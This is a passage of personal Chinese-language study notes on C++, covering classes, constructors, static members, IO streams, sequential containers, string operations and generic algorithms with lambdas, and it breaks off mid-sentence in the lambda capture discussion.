可以在类中定义类型别名，而且这个类名也一样可以设置 public 或者 private 的权限（有啥用？）；不过类型别名需要先定义后才能使用，这点和普通成员不同；因此类型别名一般出现在开始的地方； 定义在类内部的成员函数是会自动 inline 的（隐式内联）； 成员函数也可以被重载，匹配规则跟普通函数一样 不知为何，个人不太喜欢重载这种特性，增加了复杂度，还是要写那么多个函数，而好处却仅仅是减少了命名负担）； 后来发现，对于静态类型的语言，重载貌似还是需要的，因为针对每种数据类型，单独声明多个函数来表示相同的处理过程，工作量还是挺大的； 有些数据成员可以被声明成可变的，这样即使 const 成员函数，也可以改变这个数据成员的值，一旦这个数据成员声明为 mutable，则这永远都不会再是 const； 当提供一个类内初始值，只允许有两种方式，一种是使用赋值运算符 &#x3D;，一种是使用花括号的直接初始化方式；示例如下： int member1 &#x3D; 5; &#x2F;&#x2F; 编译的时候，这种拷贝赋值的方式有可能会被编译器优化成直接初始化的方式 vector screens{“abc”}; 通过定义返回类型为引用，并返回 *this 可以实现对对象内容的改变，如果返回的内容不是引用而是对象，则返回的是一个副本，改变内容的操作是发生在副本上面，而不是发生在原对象上面； 一个 const 成员函数如果返回 *this，那么它返回的是一个常量引用，接下来我们将无法在这个引用上面做修改的操作； C++ 支持基于 const 的重载：通过限定对象本身是否为 const 类型，然后配合两个版本的函数进行重载判断，选取合适的那个函数来执行（真是有够复杂的啊）；示例如下： string&amp; front(); const string&amp; front() const; 一个类代表一种新的数据类型，即使存在另外一个类，其所有成员与当前类完全一样，它们也算是两个不同的类； 假设定义了某个类 Sales_data，那么 Sales_data item 与 class Sales_data item 二者是等价的； 仅声明类而不定义类，称为前向声明，这种状况用得很少；（是用在什么场景下呢？） 当一个类被声明后，允许在定义成员的时候，成员指向当前类类型；（貌似链表结构就是这么用的嘛） 可以用 friend class 来声明友元类，友元类可以访问私有成员；每个类负责控制自己的友元类和友元函数； 可以将其他类的某个成员函数声明为友元函数，这样当前的权限只对其他类的那个成员函数开放，对其他类的其他成员函数不开放； 如果有多个重载函数，则在声明友元时，需要逐个声明，否则未声明的不可用； 注意，友元的声明只是用来控制访问权限，它并不等同于真正的函数声明。因此，相应的友元函数仍然需要在合适的位置进行声明； 后来发现，当函数以某个类的参数时，它的作用域会增加类所属的作用域，如果在类中有声明某个友元函数，会导致这个友元函数可以被找到； 在声明其他类的某个成员函数为友元函数时，有一个前提，该友元函数在其他类中需要是 public 成员，如果是 private 成员，则无法声明成功； 为什么要设置这样的限制呢？答：可能是因为当前类需要对这个成员函数有访问权限？如果是 private 就访问不到了？ 类的作用域 类有自己的作用域，在类的作用域之外使用类，需要加上类名做为前缀，显式指定类的作用域； 在类的外部定义一个新的成员函数时，如果该函数的返回类型是在类中定义的，由于返回类型在类作用域外，因此需要显式的写上类名指定作用域，示例 Windows_mgr::ScreenIndex Windows_mgr::addScreen(const Screen &amp;s) { &#x2F;* … *&#x2F; } ; 由于类编译的两阶段（先编译数据成员，再编译函数成员），因此当数据成员中存在与外层作用域的同名变量时，实际优先使用的是类中的变量（即会覆盖外层变量）； 在类中可以使用外层的类型名，但不可以重新定义外层已经定义好的类型名； 内层的同名变量，会隐藏外层的同名变量，但通过强制使用作用域运算符，指定作用域，可以访问被隐藏的变量，但实际并不推荐这种写法，而应该是起一个不同的变量名； ::height，只有两个冒号，表示访问全局作用域（即最外层的作用域）； Screen::height，加上类名，表示访问类级别的作用域； 注意在类外声明的函数必须加上类名才是类的成员函数 class Screen; Screen::pos verify(); &#x2F;&#x2F; 这是一个全局函数；只是刚好其返回类型在类中定义，但它不是类的成员函数； Screen::pos Screen::verify(); &#x2F;&#x2F; 这是一个 Screen 的成员函数； 假设在类中定义了一种新类型，则新类型的声明需要放在类的头部，这样才方便后续的数据成员或者函数成员进行调用；如果是放在尾部，则声明前的调用是非法的； 构造函数再探 构造函数初始值列表原来是有其原因的，在 C++ 中，由于在执行构造函数的函数体之前，会先编译数据成员，并将其默认初始化，所以如果是在函数体中使用赋值初始化操作，已经晚了，此时默认初始化已经完成；因此，当数据成员包含 const，引用，或者其他未提供默认构造函数的类类型时，编译器会出现报错，因为以上三种类型是无法被默认初始化为空值的，它们必须被显式的初始化为某个已存在的对象； 最好让初始值列表的成员顺序和类的数据成员顺序一致，同时要避免使用其中一个成员去初始化另外一个成员，这样很容易出现未定义的行为；编译器默认是按类成员出现的顺序来初始化的； 如果一个构造函数为其所有参数都提供了默认实参，实际上这个构造函数就具备成为类的默认构造函数的功能； 类中不能定义两个默认构造函数，不然当无实参的对类实例化时，会出现二义性冲突； C11 引入了委托构造函数来简化构造的过程，提取了共同的部分，原理是设定一个初始的被委托构造函数，然后其他构造函数通过调用它简化一部分工作，之后在自己的函数体内定义被委托函数未完成的部分；整个构造过程的执行顺序是先执行被委托函数的部分，再执行当前构造函数自己的部分；不同的构造函数之间也可以相互调用，逐级嵌套； 被委托构造函数需要使用什么关键字？ 千万记住，一个类一旦定义了某个构造函数，最好要同时也给它定义一个默认的构造函数；（为什么？猜测原因：一旦自定义了一个构造函数，意味着编译不会再自动合成默认构造函数，因此我们需要手工自定义一个，不然无法应对未提供参数的构造场景） 不知为何，C++ 允许实现类类型的隐式转换（个人觉得普通变量的隐式转换规则就够麻烦和危险的了），例如某个类的构造函数允许使用一个 string 实参进行实例化，则在使用过程中，如果涉及 string 的运算，编译器会自动将 string 转换成类类型的临时对象；（估计这也是为什么 string 和字面串字面值可以运算的原因） 注意：隐式转换只会发生在构造函数只需一个实参即可完成实例化的类中；当构造函数需要多个实参时，就不会发生隐式转换了； 为了避免这种隐式类型转换带来的困扰，C++ 又引入了 explicit 关键字来对构造函数的声明进行限定（唉，C++ 真是会自寻烦恼）； 另外 explicit 只允许在类里面的构造函数声明中使用，在类外面声明定义的构造函数，不允许使用 explicit 关键字； 被 explicit 声明过的构造函数，只能使用直接初始化的方式，不能使用赋值的方式完成初始化（为什么？因为无法触发隐式类型转换；但是，貌似还可以通过重载赋值运算符的来实现）（突然想到，之前碰到的奇怪现象，即虽然重载了赋值运算符，但是实际赋值的时候，编译器调用的却是拷贝构造函数，看来好像是因为触发了隐式类型转换） string null_book &#x3D; “999-999-1323” Sales_data item &#x3D; null_book &#x2F;&#x2F; 如果构造函数声明为 explicit ，则此种初始化方式不可行； 虽然声明 explicit 后不能隐式转换，但可以通过 static(null_book) 进行显式的强制类型转换； 聚合类：有什么用？（感觉很像 C 语言中的结构体 struct） 条件：所有成员都是 public，没有类内初始值，没有构造函数，没有基类，也没有 virtual 函数（什么是 virtual 函数？虚函数，用来实现多态） 聚合类可以使用花括号括起来的初始值列表进行初始化；但聚合类的初始化跟数组的初始化有点像，元素需要严格按照顺序，初始值数量需要少于或等于成员数量，超过会报错； 聚合类有点危险，例如假设向聚合类添加一个成员，以前的初始化语句将不再能用，全部需要重新修改（所以搞不明白为什么发明聚合类这种怪东西出来） 字面值常量类：什么场景下适合使用？？？ 类的静态成员 当我们希望某个值是属于类，与类相关，而不是单个对象的时候，可以通过声明静态成员来实现。这样做的好处是，当这个静态成员发生变动时，所有的对象都可以第一时间获得；（注意：当某个数据成员被声明为 static 时，实例化中的对象，是不包含这个数据成员的，我们需要使用类的作用域指针来访问这个属于类的数据成员； 通过在类的数据成员前面加上 static 关键字实现静态说明； 由于静态成员是属于类的，因此对象中没有包含静态成员的数据，静态成员是被所有的类对象共享的；因此，静态成员函数是没有 this 指针的，因为它不附属于某个对象；需要使用“类名::数据成员名”的方式来访问； 类的静态成员函数可以在类的外部定义，但需要先在类的内部使用 static 关键字进行声明，之后在外部定义的时候，不能再次使用 static 关键字，否则会出错； 据说不能在类内部初始化静态数据成员（声明需要在内部，为什么？），只能在类的外部定义和初始化每个静态数据成员；因此，由于静态成员定义在函数之外，看上去像是全局变量； 为了确保静态成员对象只被定义一次，比较好的做法是将定义放在一个单独的文件中，其他文件只是引用； 静态成员可以在类内部做初始化，但即使一个常量静态数据成员在类内部已经初始化了，正常也应该在类外部再次对其进行定义（为什么要这么做呢？） 类内初始化的要求：必须是 const 整数类型，或者是字面值类型的 constexpr 表达式；原因：编译器才能够算出值，然后进行替换； 静态成员的某些使用场景 可以作为成员函数的默认实参，而普通数据成员则不能；（为什么？） 静态数据成员可以是不完全类型（什么是不完全类型？有声明，但还没有定义的类型），因此，它可以指向类本身，而普通成员则只能声明成当前类的指针或者引用； 静态成员不会被构造函数初始化，因此它需要单独进行定义和初始化； 静态成员可以是 public，也可以是 private，类型可以是常量、指针、引用或者类类型； IO 库 IO 类 面向不同种类的IO操作，分别定义在三个不同的头文件中，分别是： iostream，流的读写； fstream，文件的读写 sstream，内存 string 的读写 IO 对象不能被拷贝或者赋值，因此只能通过引用类型来访问它，由于访问的时候会改变它，因此不能定义成 const 类型； 流只有在有效的状态下，才能够正常读写，但流有可能处于无效状态，因此读写前有必要判断一下状态，可以通过如下方式判断：while(cin &gt;&gt; word) { &#x2F;…&#x2F; }; 此处的 cin &gt;&gt; word 返回的仍然是流的引用，在 while 条件语句中，会触发流的引用进行隐式的 bool 类型转换； 标准库定义了一种 isstate 类型来表示流所处的状态，分别有 badbit, failbit, eofbit, goodbit 等状态；当流进入某种状态时，相应的状态变量会被置位； 通过调用 good() 和 bad() 可以获取流状态是否正常，eof 和 badbit 则用来表示特定类型的异常； cin.clear(cin.rdstate &amp; ~cin.failbit &amp; ~cin.badbit); &#x2F;&#x2F; failbit 和 badbit 复位，其他 bit 位保持不变（注意这里的操作使用的是位运算符 &amp; 和 ~，因为这些状态都是使用位模式表示） 原来流操作的缓冲区的目的，在于操作系统想将多个流操作合并成一个系统级的操作，提高效率（因为写操作很费时，合并后可以得到很大的性能提升）； flush 和 ends 都可以用来刷新缓冲区，区别在于后者会插入一个空字符后再刷新，而前者则直接刷新，其他啥没做； 通过配对使用 unitbuf 和 nounitbuf 可以实现在二者之间的输出，都是无缓冲的； 当程序发生崩溃时，缓冲区是不会自动刷新的，因此调试的时候，要确保缓冲区有刷新，这样才能获得实时的程序状态； 输入流 cin 和输出流 cout 是关联的，意味着当输入流进行操作时，输出流会被刷新（先于输入流的操作发生）； 每个流最多关联一个流，但多个流可以同时关联的同一个输出流 ostream；（虽然关联只能一个，但被关联貌似可以多个的样子） 文件输入输出 创建文件流对象时，如果提供文件名，则 open 函数会被自动调用，示例： ifstream file1(file_name); ofstream file2(file_name2); 由于 fstream 是对 iostream 的继承，因此在使用 iostream 的地方，也可以替换使用 fstream; 如果一开始定义了一个空的文件对象，则后续仍然可以使用对象的 open 方法来关联文件； 由于 open 有可能执行失败，因此在对文件进行下一步操作前，有必要先检查一下文件流状态，示例 if(file2) { … }; 一个文件流关联打开某个文件后，在关闭前不能再次关联其他文件，需要先关闭才行； 当一个 fstream 被销毁时，它的 close 方法会被自动调用； getline(is, s) 一次会读取一行，&lt;&lt; 运算符一次只读取一个单词，即遇到空格会截断； 文件模式：in, out, app, ate, trunc, binary； ifstream 默认以 in 模式打开， ofstream 默认以 out 打开，fstream 默认以 in 和 out 模式打开； out 模式打开已存在的文件时，默认会清空里面的数据；如果要保留数据，必须显式的指定 app 或者 in 模式； 示例：ofstream fin(“filename”, ofstream::app) 调用 open 函数时，会有打开模式，如果没有显式指定，会隐式自动默认； string 流 istringstream 用来写入，ostringstream 用来读取，iostringstream 用来读取和写入； 创建方法：sstream strm; sstream strm(s) 读取方法：strm.str() 返回的是一个 string 对象，可以使用 string 的相关方法； 写入方法：strm.str(s) string 的操作和 istringstream 拥有的操作是不同的，有时候可以考虑将它们互相转换一下，获取相应的操作办法； 对于范围 for 循环，记得优先使用 const auto &amp; 的方式，有诸多好处； 顺序容器 顺序容器概述 容器类型：vector, deque, list, forward_list, array, string; 除非没有很好的理由，不然优先使用 vector，因为 vector 可以使用 sort 进行排序； 容器的属性 iterator, const_iterator &#x2F;&#x2F; 迭代器类型 size_type, difference_type &#x2F;&#x2F; 容器大小（无符号整数），距离（有符号整数） value_type &#x2F;&#x2F; 元素的类型 reference, const_reference &#x2F;&#x2F; 元素引用类型 容器库概览 构造函数 C c &#x2F;&#x2F; 默认构造空容器 C c1(c2) &#x2F;&#x2F; 拷贝c2 来初始化 c1 C c(b, e) &#x2F;&#x2F; 使用范围 b&#x2F;e 来初始化 c C c{a, b, c} &#x2F;&#x2F; 使用列表初始化 c 顺序容器 C seq(n) &#x2F;&#x2F; 不适用 string 类型 C seq(n, t) 赋值操作 c1 &#x3D; c2; c1 &#x3D; {a, b, c}; a.swap(b); swap(a, b) 大小操作 c.size() c.max_size() c.empty() 容器一般都定义在同名的头文件中；例如 vector 定义在 中，deque 定义中 中； size_type 是容器的下标类型（注：下标类型不是 int 类型） size_type, iterator, const_iterator 三者都可以用来访问容器内的元素，但是链表类型只适合于使用后两者进行访问，因为链表不能通过下标访问； 通过 auto 与 begin&#x2F;end 配合，可以得到容器的类型，如果容器类型是 const ，就会返回 const iterator，示例如下： auto it1 &#x3D; a.begin(); &#x2F;&#x2F; 获得的迭代器类型依赖于容器 auto it2 &#x3D; a.end(); &#x2F;&#x2F; 同上； auto it3 &#x3D; a.cbegin(); &#x2F;&#x2F; 显式指定获得 const 类型的迭代器； auto it4 &#x3D; a.cend(); &#x2F;&#x2F; 同上； 当不需要写访问时，应该优先使用 cbegin 和 cend； 当将一个容器初始化为另外一个容器时，两个容器的容器类型和元素类型需要一致；如果使用一对迭代器做为参数，来拷贝容器中的一段元素，则不要求容器类型和元素类型相同；例如可以将 vector 容器的元素，拷贝生成 deque 容器的元素； 如果容器的元素类型是内置类型，或者具有默认构造函数，则可以只提供一个表示容器大小的参数；如果不是，则还需要再多提供一个元素初始值； array 不支持普通容器构造函数，它有自己的格式要求；大小是 array 类型的一部分；定义时需要同时显式指定元素类型和元素数量，例如：array&lt;int, 10&gt;, array&lt;string, 20&gt;； 虽然内置数组类型不支持拷贝或者赋值，但 array 类型则可以支持，示例 int arr1[10] &#x3D; {0}; &#x2F;&#x2F; arr1 是内置数组类型 int arr1_copy[10] &#x3D; arr1; &#x2F;&#x2F; 错误，因为内置数组类型不支持赋值运算符； array&lt;int, 10&gt; arr2 &#x3D; {0}; &#x2F;&#x2F; arr2 是 array 类型； array&lt;int, 10&gt; arr2_copy &#x3D; arr2; &#x2F;&#x2F; 正确，array 类型支持赋值运算符； array 类型变量不支持花括号的列表赋值，但可以花括号的列表初始化。除了 array 以外的容器，列表初始化和列表赋值两种操作都可以支持； array&lt;int, 3&gt; a &#x3D; {1, 2, 3}; &#x2F;&#x2F; 正确，使用花括号进行初始化； array&lt;int, 3&gt; b &#x3D; {0}; &#x2F;&#x2F; 正确 ，使用花括号进行初始化； a &#x3D; b; &#x2F;&#x2F; 正确，使用赋值运算符； a &#x3D; {0}; &#x2F;&#x2F; 错误，由于 a 已经初始化过了，故此处是使用花括号赋值，不支持； 赋值相关运算，会导致原来指向左边容器内部的迭代器，指针和引用失效；而 swap 由于是交换容器内容，不会引起指向内部的迭代器、指针、引用失效； assign 支持范围段的拷贝，示例：names.assign(oldstype.begin(), oldstyle.end()); swap 可以用来交换两个容器内的内容（除了 string 容器外，据说交换速度会很快）（估计是通过交换指针来实现）； swap 操作不会导致原来的指针、迭代器、引用失效，但会变成指向了交换后的新容器（怎么感觉好像存在越界的风险，例如原来指向第18位，新交换的容器要是少于18位怎么办？）； swap 有成员函数版本和非成员函数版本，推荐使用后者，即 swap(a, b)，而不是 a.swap(b)； 容器的关系运算符，实质上是使用元素的关系运算符进行比较，因此容器比较的前提是，元素是相同的类型，且支持某种关系运算符（默认是小于号，如果不是，则需要提供自定义的版本）； forward_list 有一个其他容器没有的 before_begin 独特方法；（原因：它只能单向添加元素，因此有一头是固定的；其他容器两头都可以添加元素，故没有哪头是固定的） 顺序容器操作 添加元素 c.push_back(t), c.emplace_back(args) &#x2F;&#x2F; 返回 void c.push_front(t), c.emplace_front(t) &#x2F;&#x2F; 返回 void c.insert(p, t), c.emplace(p, t) &#x2F;&#x2F; 返回新添加的元素的迭代器 c.insert(p, n, t) &#x2F;&#x2F; 返回新添加的第一个元素的迭代器 c.insert(p, b, e) &#x2F;&#x2F; 返回新添加的第一个元素的迭代器，b&#x2F;e 不能指向 c 自己； c.insert(p, il) &#x2F;&#x2F; il 为花括号包围的列表，返回新添加的第一个元素的迭代器； 总结发现：所有 insert 操作都跟 p 有关系，都需要提供 p ； 向 vector, string, deque 插入一个元素，会导致所有原指向该容器的迭代器、指针、引用等都失效； insert 的迭代器范围参数，不允许指向当前容器自己；（可以先拷贝一份出来临时存储，然后再插入） 访问元素 c.front()，c.back() &#x2F;&#x2F; 返回首元素、尾元素的引用 c[n] &#x2F;&#x2F; 返回第 n 个元素的引用，如果 n 越界，会产生未定义行为； c.at(n) &#x2F;&#x2F; 返回第 n 个元素的引用，此方法更安全，如果 n 越界，会抛出 out_of_range 的异常； front 和 back 可以分别用来获取容器的首尾元素的引用，c.front(), c.back()；（注意：forward_list 不支持 back） 在获取容器的元素前，记得先判断容器非空，以避免引用一些未定义的行为； auto v &#x3D; c.back( )，虽然 back 返回引用，但由于 auto v 没有使用 &amp; 符号，故会触发拷贝赋值，即将 back 返回的引用的值拷贝给 v；如果想要实现 v 为引用，则需要定义成 auto &amp;v； 删除元素 c.pop_back(), c.pop_front() &#x2F;&#x2F; 分别删除尾元素和首元素；返回 void c.erase(p) &#x2F;&#x2F; 删除迭代器 p 所指定的元素，返回 p 之后的迭代器 c.erase(b, e); &#x2F;&#x2F; 删除 b&#x2F;e 范围内的元素，返回范围之后的第一个元素； c.clear() &#x2F;&#x2F; 删除所有元素，返回 void 当删除 deque 除首尾外的任何元素时，都会导致原来指向 deque 的所有迭代器、指针、引用等失效； vector&#x2F;string 删除点之后的迭代器、指针、引用将失效； 弹出元素的成员函数 pop 的返回值是 void，所以如果想获得弹出元素的值，应该在弹出前获取； 非成员函数 begin 和 end 也可以用来获取内置数组类型的首尾指针地址，示例：begin(arr), end(arr); 所以貌似用这两个元素，可以较好的防范越界行为； vector 可以使用内置数组类型的首尾指针地址初始化，示例：vector v1(begin(arr), end(arr)) 其中的 begin(arr) 也可由 arr 直接代表，即简写为 vector v1(arr, end(arr)); 在定义函数的 string 类型形参时，应记得在参数列表中尽量使用引用类型；（这样可以减少对 string 的拷贝，减少内存开销）（而且可以处理字符串字面值实参的情况）； void 类型的函数仍然可以使用 return 语句，只不过该语句不能有其他东西，只能有一个 return 单词； 可以使用在想提前结束退出函数的场景； 改变容器大小 c.resize(n) c.resize(n, t) &#x2F;&#x2F; 每个成员初始化为 t 如果 resize 变大了容器，则需要通过可选参数提供增加的元素的初始值，如果增加的元素如果是类类型，要求类类型本身自带默认构造函数； 如果 resize 会缩小容器，则原来的迭代器，指针、引用等都会失效； 对于 deque，如果在头部添加元素，会导致迭代器失效，但原来的指针和引用仍然有效； 好奇 deque 的实现方法是否跟 vector 一样提前预分配内存？ 如果是在尾部添加元素，原来的指针、迭代器、引用应该都还会有效吧？ 由于容器的插入和删除操作，都很可能会使用原来的迭代器失效，因此在插入和删除操作的循环中，不应该使用变量保存 end() 返回的尾迭代器，而应该每次循环都重新计算； insert 的点如果在 begin 前，则也会导致 begin 迭代器失效，因此这种情况下 insert 后应该当即重新赋值 begin； 复合语句（如 iter +&#x3D; 2) 不适用于 list 和 forward_list 的迭代器运算 原因：突然想到，迭代器的本质，可能只是对指针的封装，链表的实现原理决定它的内存不需要连续存储，因而迭代器也即指针地址的递增运算对于链表应该是无效的；链表也不支持下标访问； 注意，只是不适用于链表，对于 vector 和 string 的迭代器，以上运算都是支持的，所以说优先使用 vector，除非有频繁的插入操作； 由于列表的迭代器不支持加法和减法运算，因此无法通过加减法来计算列表的迭代器之间的距离，不过可以使用 distance 函数来计算，distance(a, b) 和 distance(b, a) 的结果是不一样的； 那如果要在链表中一次跳转多个元素要如何实现呢？ vector 对象是如何增长的 实现原理：提前预留，阶段性重新分配；（实现的策略目测好像是按当前的 capacity 进行翻倍） shrink_to_fit 要求退回内存，但只是一个请求，编译器不一定会执行； capacity() 告诉已分配能容纳的内存大小； reserve(n) 要求至少预留的大小，实际编译器的分配可能会更大，原则上是不小于 n 即可； 额外的 string 操作 构造 string 的其他方法 按指定数量截断数组：string s(cp, n) cp 参数为指向数组的指针，n 是可选参数，但如果没有 n，则 cp 需要有空字符做为结束，不然行为是未定义的；另外此数组需要至少有 n 个字符； 这里面有一个比较操蛋的地方是，我们设置条件判断 cp 是否有空字符串做为结束；因为如果想通过遍历 cp 来检查，一旦没有结束符，这个检查本身也会触发未定行为； 目测这个示例代码的功能，好像是通过 C 风格字符串来初始化 string 类型的 s，这么说，还有一种可能的写法为 string s(cp, sizeof(cp) - 1); 从 string 某个指定位置开始截取余下部分：string s1(s2, pos) 如果 pos 越界了，会抛出异常；即 pos 应小于等于 s2 的 size；假设要获得首字符之后的内容，可以为 string(s2, 1); 目测 pos 好像是一个整数下标； 从 string 某个指定位置开始截取指定长度的字符：string s1(s2, pos, len)，假设要取第1到8个字符，可以为 string(s2, 1, 8); substr 获取子字符串，格式为 s.substr(pos, n) &#x2F;&#x2F; 这个用法同 string s2(s, pos, len) string 类型也是容器类型的一种，本身也支持用其他容器进行范围段初始化，只要元素能转换即可，示例 vec vc{‘H’, ‘i’}; string s(vc.cbegin(), vc.cend()); 改变 string 的其他方法 基本操作 s.insert(pos, args) &#x2F;&#x2F; 参数 pos 表示下标，返回一个指向 s 的引用；接受迭代器的版本，返回指向第一个插入字符的迭代器； s.erase(pos, len) &#x2F;&#x2F; 返回指向 s 的引用 s.assign(args) &#x2F;&#x2F; 返回指向 s 的引用； 为什么不直接是 s &#x3D; args？答：也是可以滴； s.append(args) &#x2F;&#x2F; 返回指向 s 的引用； s.replace(range, args) &#x2F;&#x2F; 返回指向 s 的引用 range 可以是下标+长度，或者一对迭代器； args 可以是以下形式之一（ assign 和 append 支持所有形式，str 不能是 s 自己，迭代器 b&#x2F;e 不能指向 s 自己） str str, pos, len cp, len cp &#x2F;&#x2F; 此种格式要求 cp 有结束符，不然会出错； n, c b, e 初始化列表 接受下标为参数 s.insert(下标，字符数量，字符）&#x2F;&#x2F; 返回一个指向 s 的引用； s.erase(下标，字符数量） 接受 C 风格的字符串的指针为参数； const char *cp &#x3D; “hello, world.”; s.assign(cp指针, 字符数量）&#x2F;&#x2F; 实现 assign 赋值； s.insert(下标，cp + 7）&#x2F;&#x2F; 第二个参数 cp + 7 也是表示指针位置 接受其他 string 为参数 s1.insert(下标, s2) s1.inser(s1下标, s2, s2下标, 字符数量） s.append(“abc”)，在末尾插入字符串； s.replace(range, args), range 和 args 支持很多种格式； s.replace(下标，替换字符数量，待插入字符串） s.replace(左迭代器，右迭代器，待插入字符串） &#x2F;&#x2F; 注：迭代器不能指向 s 搜索 string 的方法 s.find(args) &#x2F;&#x2F; args 第一次出现的位置，如果没有找到返回 npos (string::npos, unsigned 的最大值）； s.rfind(args) &#x2F;&#x2F; args 最后一次出现的位置，可以用来实现从右往左搜索； s.find_first_of(args) &#x2F;&#x2F; args 任意一个字符第一次出现的位置 s.find_last_of(args) &#x2F;&#x2F; args 任意一个字符最后一次出现的位置 s.find_first_not_of(args) &#x2F;&#x2F; 第一个非 args 字符出现的位置 s.find_last_not_of(args) &#x2F;&#x2F; 最后一个非 args 字符出现的位置 args 格式 c, pos &#x2F;&#x2F; 从 string 中的位置 pos 开始找字符 c；pos 的默认值为 0，表示从头开始找； s2, pos &#x2F;&#x2F; 从 string 中的位置 pos 开始找字符串 s2； cp, pos &#x2F;&#x2F; 从 string 中的位置 pos 开始找指针 cp 指向的 C 风格字符串； cp, pos, n &#x2F;&#x2F; 同上，n 表示 cp 指向的字符串的前 n 个字符； compare 函数： s.compare(s2) &#x2F;&#x2F; 比较两个字符串，判断大于、等于还是小于；返回0，正数或者负数； s.compare(pos1, n1, s2) &#x2F;&#x2F; 将 s 中从位置 pos1 开始的第 n1 个字符串，与 s2 进行比较； s.compare(pos1, n1, s2, pos2, n2) &#x2F;&#x2F; 将 s 中从位置 pos1 开始的第 n1 个字符串，与 s2 中从位置 pos2 开始的第 n2 个字符进行比较； s.compare(cp) &#x2F;&#x2F; 与指针 cp 指向的 C 风格字符串进行比较； s.compare(pos1, n1, cp) &#x2F;&#x2F; 将 s 中从位置 pos1 开始的第 n1 个字符串，与指针 cp 指向的 C 风格字符串进行比较； s.compare(pos1, n1, cp, n2) &#x2F;&#x2F; 将 s 中从位置 pos1 开始的第 n1 个字符串，与指针 cp 指向的 C 风格字符串的前 n2 个字符串进行比较 数值转换 其他各种类型转 string 直接使用 to_string 函数即可，示例：string s &#x3D; to_string(i) &#x2F;&#x2F; 将整数转换成字符串； double d &#x3D; stod(s) &#x2F;&#x2F; 字符串转 double stoi, stol, stoul, stoll, stoull, stof, stod, stold 容器适配器 适配器：就像现实生活中的电源充电器转换头一样，适配器的目的是输入一种类型进行转换，使之产生的效果像另外一样类型； 容器适配器可以用来生成基于容器构建的新抽象类型，包括栈 stack，队列 queue，优先队列 priority_queue stack 默认使用 deque 实现，但如果要使用 list 或 vector 也可以，例如 stack&lt;string, vector&gt;; 初始化方法 声明空对象，stack&lt;string, vector&gt; stk1 用一个已有的适配器初始化一个新的 stack&lt;string, vector&gt; stk2(stk1) 栈的操作 stk.pop() stk.top() stk.push(item) stk.emplace(args) 队列的操作 que.pop(), que.push(item), que.emplace(args) que.front(), que.back() 泛型算法 概述 大部分泛型算法定义在头文件 algorithm 中，也有部分数值相关的算法定义在 numeric 头文件中； 算法通过迭代器参数，实现对容器内元素的遍历操作； 初识泛型算法 只读算法 find(b, e, t) 用来实现元素的定位，返回第一个匹配的元素迭代器； find_if 的第三个参数为可以是一个值，也可以是一个 predictate 谓词，用来判断元素是否满足条件的函数 count(b, e, t) 用来计算出现次数； accumulate(b, e, init) 用来实现累加；累加的效果取决于元素本身对加法运算符的支持情况 不知是否可以实现自定义运算符? 答：支持自定义运算，格式为 accumulate(b, e, init, predictate) accumulate 定义在头文件 中； equal(b, e, s2.begin()) 用来实现比对是否相等；&#x2F;&#x2F; 此处 equal 假设第二个迭代序列比第一个长，如果短，则可能发生未定义错误； 泛型算法本身不会执行容器的操作；注意这句话的意思，是指关于容器本身的操作，例如 resize，push_back 之类；但不是不会执行对容器元素的操作，泛型算法是可以对容器元素进行操作的；如果想对容器进行操作，可以通过一类特殊的迭代器，例如 inserter 来实现； 写容器元素的算法 由于算法不会改变容器大小，因此需要确定写入的元素数量应小于等于容器大小；(可以通过 inserter 避开这个问题） 有些算法接收两个序列，此时第二个序列有两种表示方式，一种使用单一迭代器，一种使用成对迭代器；对于单一迭代器，默认假设第二个序列的长度不小于第一个序列，如果小于，则可能发生未定义行为（访问第二个序列末尾并不存在的元素）； 由于算法不能改变容器大小，因此应该避免使用算法向容器中插入新元素，而只是用来改写容器中已有的元素；如果要插入新元素，应该考虑使用容器本身的方法（如 push_back)，或者使用插入迭代器 back_inserter（它本质上也是去调用容器自身的 push_back 方法） back_inserter 用法（定义在头文件 中） auto it &#x3D; back_inserter(vec); fill_n(it, 10, 0) &#x2F;&#x2F; 向 vec 插入 10 个 0；fill_n 用来向容器写入指定数量的元素（使用播入迭代器，就可以不用关心容器的大小问题了） copy 算法 接受三个迭代器，前两个表示拷贝源的范围，第三个表示目标序列的起始位置； copy(s1.begin(), s1.end(), s2.begin()) replace replace(s.begin(), s.end(), oldVal, newVal) replace_copy(s1.begin, s1.end, back_iterator(s2), oldVal, newVal); 这个函数的用于将 s1 的内容拷贝一份到 s2 末尾，并将其中的旧值替换为新值； vector 的 reserve 用来操作内存， resize 用来操作元素数量；为了避免容器越界，应该使用 resize，而不是 reserve; 重排容器元素的算法 sort(begin, end) &#x2F;&#x2F; sort 默认使用 &lt; 来比较元素，因此它可以运算的前提是元素类型本身支持 &lt; 运算符，如果不支持，则需要自定义比较操作，否则达不到预期效果； sort 也可以接受二元谓词做为第三个参数；sort(begin, end, predicate) stable_sort(begin, end, predicate) 接受一个谓词 predicate 做为参数，它的特点是可以维持相等元素的原有顺序； unique(begin, end) &#x2F;&#x2F; 重新排列元素，将不重复项提到前面，重复项放在最后面，返回指向第一个重复项的迭代器（假设叫 first_repeat），之后如果要删除这些重复项，可以调用 v.erase(first_repeat, v.end) 实现；（貌似也可以用拷贝内容到 set 来完成这一系列运作） for_each 算法 for_each(first, last, function) 定制操作 向算法传递函数 可以通过向算法传递函数来实现定制操作，有些算法支持一元谓词，有些支持二元谓词；不管一元还是二元，对于谓词参数来说，我们可以向算法传递任何可调用的对象（即callable object，支持圆括号表达式）； lambda 的格式 [capture list] （params list） -&gt; return type { func body } &#x2F;&#x2F; 返回类型需要使用尾置表示；从左到右分别为 捕获列表，参数列表，返回类型，函数体 示例 auto f &#x3D; [ ] { return 42; } &#x2F;&#x2F; 返回类型可以由于返回值进行推断，如果没有返回值，则类型自动为 void； 调用 f( ) 将返回值 42； 捕获列表是什么鬼？原来是用来指定 lambda 想要使用的局部变量（当前函数内的局部非 static 变量才需要使用捕获列表，对于 static 变量或当前函数体外的变量，不需捕获列表即可直接在 lambda 中使用）； 据说参数列表和返回类型是可选的，而捕获列表和函数体是必须的，为什么捕获列表是必须的？ 当捕获列表为空时，表示不使用它所在函数中的任何局部变量； 由于 lambda 不能有默认参数，因此它要求实参与形参的数量必须是一致匹配的； partition(begin, end, predicate) &#x2F;&#x2F; 根据 predicate 的布尔结果，将容器分为 true&#x2F;false 前后两段，返回指向最后一个 true 之后位置的迭代器； lambda 捕获列表中的变量，是在 lambda 创建时即生成并初始化的变量，它可以是拷贝，或者引用；如果是引用，需要确保在 lambda 执行期间，引用的源对象未被销毁，不然会发生未定义的行为；如果捕获的是指针或迭代器，则要特别小心，确保指针或者迭代器在 lambda 